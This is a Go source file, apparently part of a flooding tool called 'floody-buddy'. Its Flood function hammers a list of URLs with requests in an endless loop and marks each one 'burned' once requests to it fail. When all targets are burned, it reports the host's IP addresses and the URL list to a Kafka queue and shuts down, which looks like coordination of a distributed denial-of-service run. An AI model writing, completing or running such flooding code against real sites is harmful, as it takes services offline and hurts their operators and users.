package spammer

import (
	"math/rand"

	"floody-buddy/internal/models"
	"floody-buddy/internal/utils"
	"floody-buddy/pkg/kafka"
	"floody-buddy/pkg/logger"
)

var burnedUrls = make(map[string]bool)
var urls = utils.FormatUrls()
var log = logger.New()

func init() {
	for _, url := range urls {
		burnedUrls[url] = false
	}
}

func Flood() {
	for {
		if AllBurned() {
			TriggerShutdown()
			return
		}

		var url string
		if len(urls) == 1 {
			url = urls[0]
		} else {
			url = urls[rand.Intn(len(urls))]
		}

		if !IsBurned(url) {
			err := utils.MakeRequest(url)
			if err != nil {
				BurnUrl(url)
			}
		}
	}
}

func TriggerShutdown() {
	log.Info().Msg("Triggering shutdown")

	ips, err := utils.GetIPAddresses()
	if err != nil {
		log.Error().Err(err).Msg("Failed to get IP addresses")
		// NOTE: is shutdown necessary here?
		utils.Shutdown()
	}

	message := models.Message{
		IpAddress: ips,
		Urls:      urls,
	}

	payload, err := utils.FormatMessage(message)
	if err != nil {
		log.Error().Err(err).Msg("Failed to format message")
		// NOTE: is shutdown necessary here?
		utils.Shutdown()
	}

	kafka.PublishMessage(payload)
	utils.Shutdown()
}

func AllBurned() bool {
	for _, url := range urls {
		if !IsBurned(url) {
			return false
		}
	}
	log.Info().Msg("All URLs have been burned")
	return true
}

func BurnUrl(url string) {
	log.Debug().Str("url", url).Msg("Burning URL")
	burnedUrls[url] = true
}

func IsBurned(url string) bool {
	return burnedUrls[url]
}
